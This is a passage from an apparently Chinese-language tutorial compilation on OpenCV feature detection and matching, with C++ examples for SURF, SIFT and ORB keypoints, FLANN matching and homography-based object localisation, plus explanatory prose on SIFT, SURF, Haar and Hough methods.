        const CvSURFPoint* kp = (const CvSURFPoint*)kreader.ptr;
        const float* descriptor = (const float*)reader.ptr;
        CV_NEXT_SEQ_ELEM( kreader.seq->elem_size, kreader );
        CV_NEXT_SEQ_ELEM( reader.seq->elem_size, reader );
        int nearest_neighbor = naiveNearestNeighbor( descriptor, kp->laplacian, imageKeypoints, imageDescriptors );
        if( nearest_neighbor >= 0 )
        {
            ptpairs.push_back(i);
            ptpairs.push_back(nearest_neighbor);
        }
    }
}//Fast Library for Approximate Nearest Neighbors（FLANN）
void flannFindPairs( const CvSeq*, const CvSeq* objectDescriptors,
           const CvSeq*, const CvSeq* imageDescriptors, vector<int>& ptpairs )
{
 int length = (int)(objectDescriptors->elem_size/sizeof(float));    cv::Mat m_object(objectDescriptors->total, length, CV_32F);
 cv::Mat m_image(imageDescriptors->total, length, CV_32F);
 // copy descriptors
    CvSeqReader obj_reader;
 float* obj_ptr = m_object.ptr<float>(0);
    cvStartReadSeq( objectDescriptors, &obj_reader );
 //objectDescriptors to m_object 
    for(int i = 0; i < objectDescriptors->total; i++ )
    {
        const float* descriptor = (const float*)obj_reader.ptr;
        CV_NEXT_SEQ_ELEM( obj_reader.seq->elem_size, obj_reader );
        memcpy(obj_ptr, descriptor, length*sizeof(float));
        obj_ptr += length;
    }
 //imageDescriptors to m_image
    CvSeqReader img_reader;
 float* img_ptr = m_image.ptr<float>(0);
    cvStartReadSeq( imageDescriptors, &img_reader );
    for(int i = 0; i < imageDescriptors->total; i++ )
    {
        const float* descriptor = (const float*)img_reader.ptr;
        CV_NEXT_SEQ_ELEM( img_reader.seq->elem_size, img_reader );
        memcpy(img_ptr, descriptor, length*sizeof(float));
        img_ptr += length;
    }    // find nearest neighbors using FLANN
    cv::Mat m_indices(objectDescriptors->total, 2, CV_32S);
    cv::Mat m_dists(objectDescriptors->total, 2, CV_32F);
 //Constructs a nearest neighbor search index for a given dataset
 //利用m_image构造 a set of randomized kd-trees 一系列随机多维检索树;
    cv::flann::Index flann_index(m_image, cv::flann::KDTreeIndexParams(4));  // using 4 randomized kdtrees
 //利用Knn近邻算法检索m_object；结果存入 m_indices, m_dists；
    flann_index.knnSearch(m_object, m_indices, m_dists, 2, cv::flann::SearchParams(64) ); // maximum number of leafs checked    int* indices_ptr = m_indices.ptr<int>(0);
    float* dists_ptr = m_dists.ptr<float>(0);
    for (int i=0;i<m_indices.rows;++i) 
 {
     if (dists_ptr[2*i]<0.6*dists_ptr[2*i+1])
  {
      ptpairs.push_back(i);
      ptpairs.push_back(indices_ptr[2*i]);
     }
    }
}//用于寻找物体(object)在场景(image)中的位置,位置信息保存在参数dst_corners中，参数src_corners由物
//体(object的width几height等决定，其他部分参数如上findPairs
/* a rough implementation for object location */
int locatePlanarObject( const CvSeq* objectKeypoints, const CvSeq* objectDescriptors,
 const CvSeq* imageKeypoints, const CvSeq* imageDescriptors,
 const CvPoint src_corners[4], CvPoint dst_corners[4] )
{
    double h[9];
    CvMat _h = cvMat(3, 3, CV_64F, h);
    vector<int> ptpairs;
    vector<CvPoint2D32f> pt1, pt2;
    CvMat _pt1, _pt2;
    int i, n;#ifdef USE_FLANN
    flannFindPairs( objectKeypoints, objectDescriptors, imageKeypoints, imageDescriptors, ptpairs );
#else
    findPairs( objectKeypoints, objectDescriptors, imageKeypoints, imageDescriptors, ptpairs );
#endif    n = (int)(ptpairs.size()/2);
    if( n < 4 )
        return 0;    pt1.resize(n);
    pt2.resize(n);
    for( i = 0; i < n; i++ )
    {
        pt1[i] = ((CvSURFPoint*)cvGetSeqElem(objectKeypoints,ptpairs[i*2]))->pt;
        pt2[i] = ((CvSURFPoint*)cvGetSeqElem(imageKeypoints,ptpairs[i*2+1]))->pt;
    }    _pt1 = cvMat(1, n, CV_32FC2, &pt1[0] );
    _pt2 = cvMat(1, n, CV_32FC2, &pt2[0] );
    if( !cvFindHomography( &_pt1, &_pt2, &_h, CV_RANSAC, 5 ))//计算两个平面之间的透视变换
        return 0;    for( i = 0; i < 4; i++ )
    {
        double x = src_corners[i].x, y = src_corners[i].y;
        double Z = 1./(h[6]*x + h[7]*y + h[8]);
        double X = (h[0]*x + h[1]*y + h[2])*Z;
        double Y = (h[3]*x + h[4]*y + h[5])*Z;
        dst_corners[i] = cvPoint(cvRound(X), cvRound(Y));
    }    return 1;
}

int main(int argc, char** argv)
{
 //物体(object)和场景(scene)的图像向来源
    const char* object_filename = argc == 3 ? argv[1] : "D:/src.jpg";
    const char* scene_filename = argc == 3 ? argv[2] : "D:/Demo.jpg";    help();    IplImage* object = cvLoadImage( object_filename, CV_LOAD_IMAGE_GRAYSCALE );
    IplImage* image = cvLoadImage( scene_filename, CV_LOAD_IMAGE_GRAYSCALE );
    if( !object || !image )
    {
        fprintf( stderr, "Can not load %s and/or %s\n",
            object_filename, scene_filename );
        exit(-1);
    }
 //内存存储器
    CvMemStorage* storage = cvCreateMemStorage(0);    cvNamedWindow("Object", 1);
    cvNamedWindow("Object Correspond", 1);    static CvScalar colors[] = 
    {
        {{0,0,255}},
        {{0,128,255}},
        {{0,255,255}},
        {{0,255,0}},
        {{255,128,0}},
        {{255,255,0}},
        {{255,0,0}},
        {{255,0,255}},
        {{255,255,255}}
    };
  
    IplImage* object_color = cvCreateImage(cvGetSize(object), 8, 3);
    cvCvtColor( object, object_color, CV_GRAY2BGR );    CvSeq* objectKeypoints = 0, *objectDescriptors = 0;
    CvSeq* imageKeypoints = 0, *imageDescriptors = 0;
    int i;
 /*
 CvSURFParams params = cvSURFParams(500, 1);//SURF参数设置：阈值500，生成128维描述符
 cvSURFParams 函数原型如下：
 CvSURFParams cvSURFParams(double threshold, int extended)
 {
  CvSURFParams params;
  params.hessianThreshold = threshold; // 特征点选取的 hessian 阈值
  params.extended = extended; // 是否扩展，1 - 生成128维描述符，0 - 64维描述符
  params.nOctaves = 4; 
  params.nOctaveLayers = 2;
  return params;
 }
 */
 CvSURFParams params = cvSURFParams(500, 1);    double tt = (double)cvGetTickCount();//计时
 /*
 提取图像中的特征点，函数原型：
 CVAPI(void) cvExtractSURF( const CvArr* img, const CvArr* mask,
 CvSeq** keypoints, CvSeq** descriptors,
 CvMemStorage* storage, CvSURFParams params, int useProvidedKeyPts CV_DEFAULT(0) );
 第3、4个参数返回结果：特征点和特征点描述符，数据类型是指针的指针，
 */
    cvExtractSURF( object, 0, &objectKeypoints, &objectDescriptors, storage, params );
    printf("Object Descriptors: %d\n", objectDescriptors->total);    cvExtractSURF( image, 0, &imageKeypoints, &imageDescriptors, storage, params );
    printf("Image Descriptors: %d\n", imageDescriptors->total);
    tt = (double)cvGetTickCount() - tt;    printf( "Extraction time = %gms\n", tt/(cvGetTickFrequency()*1000.));
    CvPoint src_corners[4] = {{0,0}, {object->width,0}, {object->width, object->height}, {0, object->height}};
    //定义感兴趣的区域
 CvPoint dst_corners[4];
    IplImage* correspond = cvCreateImage( cvSize(image->width, object->height+image->height), 8, 1 );
 //设置感兴趣区域
 //形成一大一小两幅图显示在同一窗口
    cvSetImageROI( correspond, cvRect( 0, 0, object->width, object->height ) );
    cvCopy( object, correspond );
    cvSetImageROI( correspond, cvRect( 0, object->height, correspond->width, correspond->height ) );
    cvCopy( image, correspond );
    cvResetImageROI( correspond );#ifdef USE_FLANN
    printf("Using approximate nearest neighbor search\n");
#endif
 //寻找物体(object)在场景(image)中的位置，并将信息保存（矩形框）
    if( locatePlanarObject( objectKeypoints, objectDescriptors, imageKeypoints,
        imageDescriptors, src_corners, dst_corners ))
    {
        for( i = 0; i < 4; i++ )
        {
            CvPoint r1 = dst_corners[i%4];
            CvPoint r2 = dst_corners[(i+1)%4];
   cvLine( correspond, cvPoint(r1.x, r1.y+object->height ),
    cvPoint(r2.x, r2.y+object->height ), colors[8] );
        }
    }
 //定义并保存物体(object)在场景(image)图形之间的匹配点对，并将其存储在向量 ptpairs 中，之后可以对
 //ptpairs 进行操作
    vector<int> ptpairs;
#ifdef USE_FLANN
    flannFindPairs( objectKeypoints, objectDescriptors, imageKeypoints, imageDescriptors, ptpairs );
#else
    findPairs( objectKeypoints, objectDescriptors, imageKeypoints, imageDescriptors, ptpairs );
#endif
 //显示匹配结果（直线连接）
    for( i = 0; i < (int)ptpairs.size(); i += 2 )
    {
        CvSURFPoint* r1 = (CvSURFPoint*)cvGetSeqElem( objectKeypoints, ptpairs[i] );
        CvSURFPoint* r2 = (CvSURFPoint*)cvGetSeqElem( imageKeypoints, ptpairs[i+1] );
        cvLine( correspond, cvPointFrom32f(r1->pt),
            cvPoint(cvRound(r2->pt.x), cvRound(r2->pt.y+object->height)), colors[8] );
    }    cvShowImage( "Object Correspond", correspond );
 //显示物体(object)的所有特征点
    for( i = 0; i < objectKeypoints->total; i++ )
    {
        CvSURFPoint* r = (CvSURFPoint*)cvGetSeqElem( objectKeypoints, i );
        CvPoint center;
        int radius;
        center.x = cvRound(r->pt.x);
        center.y = cvRound(r->pt.y);
        radius = cvRound(r->size*1.2/9.*2);
        cvCircle( object_color, center, radius, colors[0], 1, 8, 0 );
    }
    cvShowImage( "Object", object_color );    cvWaitKey(0); //释放窗口所占用的内存
    cvDestroyWindow("Object");
    cvDestroyWindow("Object Correspond");    return 0;
}
    opencv小试SURF算法：#include "opencv2/opencv.hpp"   int main(){     cv::Mat  image, image1 = cv::imread ("test.jpg");
    //灰度变换
    cv::cvtColor (image1,image,CV_BGR2GRAY);  std::vector<cv::KeyPoint> keypoints;  cv::SurfFeatureDetector surf(2500);  surf.detect (image,keypoints);  cv::drawKeypoints (image,keypoints,image,cv::Scalar::all (255),cv::DrawMatchesFlags::DRAW_RICH_KEYPOINTS);

    cv::namedWindow ("surf");
    cv::imshow ("surf",image);
    cv::waitKey (0);
    return 0;
}测试结果：标记圈的半径长短和特征点所在尺度有关，那条半径是特征点的方向。    SIFT算法的教程、源码及应用软件 1、ubc:DAVID LOWE---SIFT算法的创始人，两篇巨经典 http://www.cs.ubc.ca/~lowe/ 2、cmu:YanKe---PCASIFT,总结的SIFT方面的文章 http://www.andrew.cmu.edu/user/yke/ 3、ubc:M.BROWN---SIFT算法用于图像拼接的经典应用autopano-sift，包括一个SIFTLIB库 http://www.cs.ubc.ca/~mbrown/autostitch/autostitch.html http://www.cs.ubc.ca/~mbrown/panorama/panorama.html 4、toronto:Jepson---Matlab SIFT tutorial, 超级超级超级经典~ http://www.cs.toronto.edu/~jepson/csc2503/ 5、ucla:Vedaldi---加州大学一个博士生编的Matlab SIFT tutorial http://www.cs.ucla.edu/~vedaldi/ 6.http://en.wikipedia.org/wiki/Scale-inva ... _transform 7. 大牛整理的计算机视觉分类 http://www.cs.ubc.ca/~lowe/vision.html 8. http://note.sonots.com/SciSoftware/SIFT.html 9.提到了计算变换矩阵的RANSAC法 http://web.engr.oregonstate.edu/~hess/index.html 10. 仿射不变特征点检测，提到了性能评价的方法 http://www.robots.ox.ac.uk/~vgg/research/affine/ 11. 一个日本人，挺牛的 http://note.sonots.com/ 12. PCA-SIFT http://www.cs.cmu.edu/~yke/pcasift/ 13 opencv sift http://web.engr.oregonstate.edu/~hess/index.html 14 matlab sift http://www.vlfeat.org/~vedaldi/code/sift.html http://www.vlfeat.org/overview/sift.html 15 Improve Scale Invariant Feature Transform (SIFT) 斯坦福 http://robots.stanford.edu/cs223b04/project9.html 16 Known implementations of SIFT    mit http://people.csail.mit.edu/albert/ladypack/wiki/index.php/Known_implementations_of_SIFT    三、尺度不变的SURF特征surf特征是类似于SIFT特征的一种尺度不变的特征点，它的优点在于比SIFT效率要高，在实际运算中可以达到实时性的要求，关于SURF的原理这里就不过多的介绍，网络上这类的文章很多。类似于FAST特征点的求法，SURF也可以使用通用接口求得，而SURF特征的类为SurfFeatureDetector，类似的SIFT特征点的检测类为SiftFeatureDetector。 #include <opencv2/core/core.hpp>#include <opencv2/highgui/highgui.hpp>#include <opencv2/nonfree/features2d.hpp>usingnamespacecv;intmain(){Mat image=imread("../buliding.png");vector<KeyPoint> keypoints;SurfFeatureDetector surf(2500.);surf.detect(image,keypoints);drawKeypoints(image,keypoints,image,Scalar(255,0,0),DrawMatchesFlags::DRAW_RICH_KEYPOINTS);namedWindow("result");imshow("result",image);waitKey();return0;}这里有一个值得说明的问题是：OpenCV2.4版本后好像把SurfFeatureDetector这个类的定义移到了头文件nonfree/features2d.hpp中，所以头文件中要加入该文件，并且要把opencv_nonfree24xd.lib加入属性表的链接器熟悉的输入中，其中x换成你当前opencv的版本号。最终的显示效果如下：四、SURF特征的描述在图像配准中，特征点的描述往往不是位置这么简单，而是使用了一个N维向量来描述一个特征点，这些描述子之间可以通过定义距离公式来比较相近程度。SurfDescriptorExtractor 是一个提取SURF特征点以及其描述的类。下面是一个宽景图像的拼接配准的例子： #include<opencv2/core/core.hpp>#include<opencv2/highgui/highgui.hpp>#include<opencv2/nonfree/features2d.hpp>#include<opencv2/legacy/legacy.hpp>using namespacecv;intmain(){Mat image1=imread("../b1.png");Mat image2=imread("../b2.png");// 检测surf特征点vector<KeyPoint> keypoints1,keypoints2;    SurfFeatureDetector detector(400);detector.detect(image1, keypoints1);detector.detect(image2, keypoints2);// 描述surf特征点SurfDescriptorExtractor surfDesc;Mat descriptros1,descriptros2;surfDesc.compute(image1,keypoints1,descriptros1);surfDesc.compute(image2,keypoints2,descriptros2);// 计算匹配点数BruteForceMatcher<L2<float>>matcher;vector<DMatch> matches;matcher.match(descriptros1,descriptros2,matches);std::nth_element(matches.begin(),matches.begin()+24,matches.end());matches.erase(matches.begin()+25,matches.end());// 画出匹配图Mat imageMatches;drawMatches(image1,keypoints1,image2,keypoints2,matches,imageMatches,Scalar(255,0,0));namedWindow("image2");imshow("image2",image2);waitKey();return0;}程序中我们选择了25个配准点，得到最后的匹配如下：参考：http://blog.csdn.net/yangtrees/article/details/7482960/ 








最终效果：


其实这个小功能非常有用，甚至加上只有给人感觉好像人脸检测，目标检测直接成了demo了，主要代码如下：

// localize the object
	std::vector<Point2f> obj;
	std::vector<Point2f> scene;

	for (size_t i = 0; i < good_matches.size(); ++i)
	{
		// get the keypoints from the good matches
		obj.push_back(keyPoints_1[ good_matches[i].queryIdx ].pt);
		scene.push_back(keyPoints_2[ good_matches[i].trainIdx ].pt);
	}
	Mat H = findHomography( obj, scene, CV_RANSAC );

	// get the corners from the image_1
	std::vector<Point2f> obj_corners(4);
	obj_corners[0] = cvPoint(0,0);
	obj_corners[1] = cvPoint( img_1.cols, 0);
	obj_corners[2] = cvPoint( img_1.cols, img_1.rows);
	obj_corners[3] = cvPoint( 0, img_1.rows);
	std::vector<Point2f> scene_corners(4);

	perspectiveTransform( obj_corners, scene_corners, H);

	// draw lines between the corners (the mapped object in the scene - image_2)
	line( img_matches, scene_corners[0] + Point2f( img_1.cols, 0), scene_corners[1] + Point2f( img_1.cols, 0),Scalar(0,255,0));
	line( img_matches, scene_corners[1] + Point2f( img_1.cols, 0), scene_corners[2] + Point2f( img_1.cols, 0),Scalar(0,255,0));
	line( img_matches, scene_corners[2] + Point2f( img_1.cols, 0), scene_corners[3] + Point2f( img_1.cols, 0),Scalar(0,255,0));
	line( img_matches, scene_corners[3] + Point2f( img_1.cols, 0), scene_corners[0] + Point2f( img_1.cols, 0),Scalar(0,255,0));





    基本原理是利用函数：findHomography，该 函数是求两幅图像的单应性矩阵或者叫（单映射矩阵），它是一个3*3的矩阵。findHomography： 计算多个二维点对之间的最优单映射变换矩阵 H（3行x3列） ，使用最小均方误差或者RANSAC方法 。

    单应性矩阵算过后的投影点的偏移量 scene_corners[0]，就是在匹配图像中的点的位置，因为效果图像相当于增加了一个待匹配图像的宽度，所以每一个点都要加上Point2f( img_1.cols, 0)


两个重要函数的介绍：
findHomography功能：在两个平面之间寻找单映射变换矩阵结构：Mat findHomography(InputArray srcPoints, InputArray dstPoints, int method=0, double ransacReprojThreshold=3, OutputArray mask=noArray() )srcPoints ：在原平面上点的坐标，CV_32FC2 的矩阵或者vector<Point2f> dstPoints ：在目标平面上点的坐标，CV_32FC2 的矩阵或者 vector<Point2f> . method – 用于计算单映射矩阵的方法.  0 - 使用所有的点的常规方法 CV_RANSAC - 基于 RANSAC 的方法CV_LMEDS - 基于Least-Median 的方法ransacReprojThreshold： 处理一组点对为内部点的最大容忍重投影误差（只在RANSAC方法中使用），其形式为：    如果     那么点i则被考虑为内部点，如果srcPoints和dstPoints是以像素为单位，通常把参数设置为1-10范围内  这个函数的作用是在原平面和目标平面之间返回一个单映射矩阵 因此反投影误差是最小的。如果参数被设置为0，那么这个函数使用所有的点和一个简单的最小二乘算法来计算最初的单应性估计，但是，如果不是所有的点对都完全符合透视变换，那么这个初始的估计会很差，在这种情况下，你可以使用两个robust算法中的一个。 RANSAC 和LMeDS , 使用坐标点对生成了很多不同的随机组合子集（每四对一组），使用这些子集和一个简单的最小二乘法来估计变换矩阵，然后计算出单应性的质量，最好的子集被用来产生初始单应性的估计和掩码。 RANSAC方法几乎可以处理任何异常，但是需要一个阈值， LMeDS 方法不需要任何阈值，但是只有在inliers大于50%时才能计算正确，最后，如果没有outliers和噪音非常小，则可以使用默认的方法。PerspectiveTransform功能：向量数组的透视变换 结构：void perspectiveTransform(InputArray src, OutputArray dst, InputArray m)src ：输入两通道或三通道的浮点数组，每一个元素是一个2D/3D 的矢量转换dst ：输出和src同样的size和type m ：3x3 或者4x4浮点转换矩阵 转换方法为： 文档官方介绍： 实现代码：// OpenCV_sift.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>

#include <vector>
#include "opencv2/core/core.hpp"
#include "opencv2/features2d/features2d.hpp"
#include "opencv2/highgui/highgui.hpp"
#include "opencv2/legacy/legacy.hpp"
#include "opencv2/calib3d/calib3d.hpp"

using namespace cv;
using namespace std;

#pragma comment(lib,"opencv_core2410d.lib")                  
#pragma comment(lib,"opencv_highgui2410d.lib")                  
#pragma comment(lib,"opencv_objdetect2410d.lib")     
#pragma comment(lib,"opencv_imgproc2410d.lib")    
#pragma comment(lib,"opencv_features2d2410d.lib")
#pragma comment(lib,"opencv_legacy2410d.lib")
#pragma comment(lib,"opencv_calib3d2410d.lib")

int main()
{
    Mat img_1 = imread("1.jpg");
    Mat img_2 = imread("2.jpg");
    if (!img_1.data || !img_2.data)
    {
        cout << "error reading images " << endl;
        return -1;
    }

    ORB orb;
    vector<KeyPoint> keyPoints_1, keyPoints_2;
    Mat descriptors_1, descriptors_2;

    orb(img_1, Mat(), keyPoints_1, descriptors_1);
    orb(img_2, Mat(), keyPoints_2, descriptors_2);

    BruteForceMatcher<HammingLUT> matcher;
    vector<DMatch> matches;
    matcher.match(descriptors_1, descriptors_2, matches);

    double max_dist = 0; double min_dist = 100;
    //-- Quick calculation of max and min distances between keypoints
    for( int i = 0; i < descriptors_1.rows; i++ )
    { 
        double dist = matches[i].distance;
        if( dist < min_dist ) min_dist = dist;
        if( dist > max_dist ) max_dist = dist;
    }
    printf("-- Max dist : %f \n", max_dist );
    printf("-- Min dist : %f \n", min_dist );
    //-- Draw only "good" matches (i.e. whose distance is less than 0.6*max_dist )
    //-- PS.- radiusMatch can also be used here.
    std::vector< DMatch > good_matches;
    for( int i = 0; i < descriptors_1.rows; i++ )
    { 
        if( matches[i].distance < 0.6*max_dist )
        { 
            good_matches.push_back( matches[i]); 
        }
    }

    Mat img_matches;
    drawMatches(img_1, keyPoints_1, img_2, keyPoints_2,
        good_matches, img_matches, Scalar::all(-1), Scalar::all(-1),
        vector<char>(), DrawMatchesFlags::NOT_DRAW_SINGLE_POINTS);

    // localize the object
    std::vector<Point2f> obj;
    std::vector<Point2f> scene;

    for (size_t i = 0; i < good_matches.size(); ++i)
    {
        // get the keypoints from the good matches
        obj.push_back(keyPoints_1[ good_matches[i].queryIdx ].pt);
        scene.push_back(keyPoints_2[ good_matches[i].trainIdx ].pt);
    }
    Mat H = findHomography( obj, scene, CV_RANSAC );

    // get the corners from the image_1
    std::vector<Point2f> obj_corners(4);
    obj_corners[0] = cvPoint(0,0);
    obj_corners[1] = cvPoint( img_1.cols, 0);
    obj_corners[2] = cvPoint( img_1.cols, img_1.rows);
    obj_corners[3] = cvPoint( 0, img_1.rows);
    std::vector<Point2f> scene_corners(4);

    perspectiveTransform( obj_corners, scene_corners, H);

    // draw lines between the corners (the mapped object in the scene - image_2)
    line( img_matches, scene_corners[0] + Point2f( img_1.cols, 0), scene_corners[1] + Point2f( img_1.cols, 0),Scalar(0,255,0));
    line( img_matches, scene_corners[1] + Point2f( img_1.cols, 0), scene_corners[2] + Point2f( img_1.cols, 0),Scalar(0,255,0));
    line( img_matches, scene_corners[2] + Point2f( img_1.cols, 0), scene_corners[3] + Point2f( img_1.cols, 0),Scalar(0,255,0));
    line( img_matches, scene_corners[3] + Point2f( img_1.cols, 0), scene_corners[0] + Point2f( img_1.cols, 0),Scalar(0,255,0));


    imshow( "Match", img_matches);
    cvWaitKey();
    return 0;
}当然也可以用其他特征点检测的算法来做：/*
SIFT sift;
sift(img_1, Mat(), keyPoints_1, descriptors_1);
sift(img_2, Mat(), keyPoints_2, descriptors_2);
BruteForceMatcher<L2<float> >  matcher;
*/

/*
SURF surf;
surf(img_1, Mat(), keyPoints_1);
surf(img_2, Mat(), keyPoints_2);
SurfDescriptorExtractor extrator;
extrator.compute(img_1, keyPoints_1, descriptors_1);
extrator.compute(img_2, keyPoints_2, descriptors_2);
BruteForceMatcher<L2<float> >  matcher;
*/
图片：参考文献：ORB特征早在，OpenCV2.3RC中已经有了实现OpenCV中ORB特征这个是之前系列中转载整理的文章1.http://blog.csdn.net/wangyaninglm/article/details/448057092.http://docs.opencv.org/2.4.10/modules/calib3d/doc/camera_calibration_and_3d_reconstruction.html?highlight=findhomography#cv.FindHomography3.http://www.360doc.com/content/14/0410/14/10724725_367760906.shtml4.http://blog.csdn.net/chenjiazhou12/article/details/22825487?utm_source=tuicool&utm_medium=referral
5.http://blog.csdn.net/merlin_q/article/details/7026375








识别算法概述：
SIFT/SURF基于灰度图，
一、首先建立图像金字塔，形成三维的图像空间，通过Hessian矩阵获取每一层的局部极大值，然后进行在极值点周围26个点进行NMS，从而得到粗略的特征点，再使用二次插值法得到精确特征点所在的层（尺度），即完成了尺度不变。
 
二、在特征点选取一个与尺度相应的邻域，求出主方向，其中SIFT采用在一个正方形邻域内统计所有点的梯度方向，找到占80%以上的方向作为主方向；而SURF则选择圆形邻域，并且使用活动扇形的方法求出特征点主方向，以主方向对齐即完成旋转不变。
 
三、以主方向为轴可以在每个特征点建立坐标，SIFT在特征点选择一块大小与尺度相应的方形区域，分成16块，统计每一块沿着八个方向占的比例，于是特征点形成了128维特征向量，对图像进行归一化则完成强度不变；而SURF分成64块，统计每一块的dx，dy，|dx|，|dy|的累积和，同样形成128维向量，再进行归一化则完成了对比度不变与强度不变。
 
haar特征也是基于灰度图，
首先通过大量的具有比较明显的haar特征（矩形）的物体图像用模式识别的方法训练出分类器，分类器是个级联的，每级都以大概相同的识别率保留进入下一级的具有物体特征的候选物体，而每一级的子分类器则由许多haar特征构成（由积分图像计算得到，并保存下位置），有水平的、竖直的、倾斜的，并且每个特征带一个阈值和两个分支值，每级子分类器带一个总的阈值。识别物体的时候，同样计算积分图像为后面计算haar特征做准备，然后采用与训练的时候有物体的窗口同样大小的窗口遍历整幅图像，以后逐渐放大窗口，同样做遍历搜索物体；每当窗口移动到一个位置，即计算该窗口内的haar特征，加权后与分类器中haar特征的阈值比较从而选择左或者右分支值，累加一个级的分支值与相应级的阈值比较，大于该阈值才可以通过进入下一轮筛选。当通过分类器所以级的时候说明这个物体以大概率被识别。
 
广义hough变换同样基于灰度图，
使用轮廓作为特征，融合了梯度信息，以投票的方式识别物体，在本blog的另一篇文章中有详细讨论，这里不再赘述。
特点异同对比及其适用场合：
 
三种算法都只是基于强度（灰度）信息，都是特征方法，但SIFT/SURF的特征是一种具有强烈方向性及亮度性的特征，这使得它适用于刚性形变，稍有透视形变的场合；
haar特征识别方法带有一点人工智能的意味，对于像人脸这种有明显的、稳定结构的haar特征的物体最适用，只要结构相对固定即使发生扭曲等非线性形变依然可识别；
广义hough变换完全是精确的匹配，可得到物体的位置方向等参数信息。前两种方法基本都是通过先获取局部特征然后再逐个匹配，只是局部特征的计算方法不同，SIFT/SURF比较复杂也相对稳定，haar方法比较简单，偏向一种统计的方法形成特征，这也使其具有一定的模糊弹性；
广义hough变换则是一种全局的特征——轮廓梯度，但也可以看做整个轮廓的每一个点的位置和梯度都是特征，每个点都对识别有贡献，用直观的投票，看票数多少去确定是否识别出物体。
 
SIFT/SURF算法的深入剖析——谈SIFT的精妙与不足
SURF算法是SIFT算法的加速版，opencv的SURF算法在适中的条件下完成两幅图像中物体的匹配基本实现了实时处理，其快速的基础实际上只有一个——积分图像haar求导，对于它们其他方面的不同可以参考本blog的另外一篇关于SIFT的文章。
 
    不论科研还是应用上都希望可以和人类的视觉一样通过程序自动找出两幅图像里面相同的景物，并且建立它们之间的对应，前几年才被提出的SIFT（尺度不变特征）算法提供了一种解决方法，通过这个算法可以使得满足一定条件下两幅图像中相同景物的某些点（后面提到的关键点）可以匹配起来，为什么不是每一点都匹配呢？下面的论述将会提到。
 
     SIFT算法实现物体识别主要有三大工序，
1、提取关键点；
2、对关键点附加详细的信息（局部特征）也就是所谓的描述器；
3、通过两方特征点（附带上特征向量的关键点）的两两比较找出相互匹配的若干对特征点，也就建立了景物间的对应关系。
 
      日常的应用中，多数情况是给出一幅包含物体的参考图像，然后在另外一幅同样含有该物体的图像中实现它们的匹配。两幅图像中的物体一般只是旋转和缩放的关系，加上图像的亮度及对比度的不同，这些就是最常见的情形。基于这些条件下要实现物体之间的匹配，SIFT算法的先驱及其发明者想到只要找到多于三对物体间的匹配点就可以通过射影几何的理论建立它们的一一对应。首先在形状上物体既有旋转又有缩小放大的变化，如何找到这样的对应点呢？于是他们的想法是首先找到图像中的一些“稳定点”，这些点是一些十分突出的点不会因光照条件的改变而消失，比如角点、边缘点、暗区域的亮点以及亮区域的暗点，既然两幅图像中有相同的景物，那么使用某种方法分别提取各自的稳定点，这些点之间会有相互对应的匹配点，正是基于这样合理的假设，SIFT算法的基础是稳定点。
 
SIFT算法找稳定点的方法是找灰度图的局部最值，由于数字图像是离散的，想求导和求最值这些操作都是使用滤波器，而滤波器是有尺寸大小的，使用同一尺寸的滤波器对两幅包含有不同尺寸的同一物体的图像求局部最值将有可能出现一方求得最值而另一方却没有的情况，但是容易知道假如物体的尺寸都一致的话它们的局部最值将会相同。SIFT的精妙之处在于采用图像金字塔的方法解决这一问题，我们可以把两幅图像想象成是连续的，分别以它们作为底面作四棱锥，就像金字塔，那么每一个截面与原图像相似，那么两个金字塔中必然会有包含大小一致的物体的无穷个截面，但应用只能是离散的，所以我们只能构造有限层，层数越多当然越好，但处理时间会相应增加，层数太少不行，因为向下采样的截面中可能找不到尺寸大小一致的两个物体的图像。有了图像金字塔就可以对每一层求出局部最值，但是这样的稳定点数目将会十分可观，所以需要使用某种方法抑制去除一部分点，但又使得同一尺度下的稳定点得以保存。有了稳定点之后如何去让程序明白它们之间是物体的同一位置？研究者想到以该点为中心挖出一小块区域，然后找出区域内的某些特征，让这些特征附件在稳定点上，SIFT的又一个精妙之处在于稳定点附加上特征向量之后就像一个根系发达的树根一样牢牢的抓住它的“土地”，使之成为更稳固的特征点，但是问题又来了，遇到旋转的情况怎么办？发明者的解决方法是找一个“主方向”然后以它看齐，就可以知道两个物体的旋转夹角了。下面就讨论一下SIFT算法的缺陷。
 
      SIFT/SURT采用henssian矩阵获取图像局部最值还是十分稳定的，但是在求主方向阶段太过于依赖局部区域像素的梯度方向，有可能使得找到的主方向不准确，后面的特征向量提取以及匹配都严重依赖于主方向，即使不大偏差角度也可以造成后面特征匹配的放大误差，从而匹配不成功；另外图像金字塔的层取得不足够紧密也会使得尺度有误差，后面的特征向量提取同样依赖相应的尺度，发明者在这个问题上的折中解决方法是取适量的层然后进行插值。SIFT是一种只利用到灰度性质的算法，忽略了色彩信息，后面又出现了几种据说比SIFT更稳定的描述器其中一些利用到了色彩信息，让我们拭目以待。
 
      最后要提一下，我们知道同样的景物在不同的照片中可能出现不同的形状、大小、角度、亮度，甚至扭曲；计算机视觉的知识表明通过光学镜头获取的图像，对于平面形状的两个物体它们之间可以建立射影对应，对于像人脸这种曲面物体在不同角度距离不同相机参数下获取的两幅图像，它们之间不是一个线性对应关系，就是说我们即使获得两张图像中的脸上若干匹配好的点对，还是无法从中推导出其他点的对应。
 
 
opencv源码解析之(3)：特征点检查前言1
     因为最近准备看特征点检查方面的源码，而其中最著名的算法就是sift和surf。因此这次主要是学会怎样使用opencv中的sift和surf函数来检测特征点和描述特征点，以及怎样使用其算法来进行特征点匹配。庆幸的是，sift算法虽然是专利，但是在opencv的努力下也获得了作者的允许，将其加入了新版本的opencv中了。
使用环境：opencv2.3.1+vs2010
功能：找出2幅图中特征点，并将其描述出来，且在2幅中进行匹配。2幅图内容相同，但是经过了曝光，旋转，缩放处理过。
首先来看sift算法函数的使用。
工程代码：

// sift_test.cpp : 定义控制台应用程序的入口点。

#include "stdafx.h"
#include <stdio.h>
#include <iostream>
#include "opencv2/core/core.hpp"//因为在属性中已经配置了opencv等目录，所以把其当成了本地目录一样
#include "opencv2/features2d/features2d.hpp"
#include "opencv2/highgui/highgui.hpp"

usingnamespace cv;
usingnamespace std;

void readme();

int main(int argc,char* argv[])
{
    Mat img_1=imread("./image/query.png",CV_LOAD_IMAGE_GRAYSCALE);//宏定义时CV_LOAD_IMAGE_GRAYSCALE=0，也就是读取灰度图像
    Mat img_2=imread("./image/rs_query.png",CV_LOAD_IMAGE_GRAYSCALE);//一定要记得这里路径的斜线方向，这与Matlab里面是相反的

if(!img_1.data || !img_2.data)//如果数据为空
    {
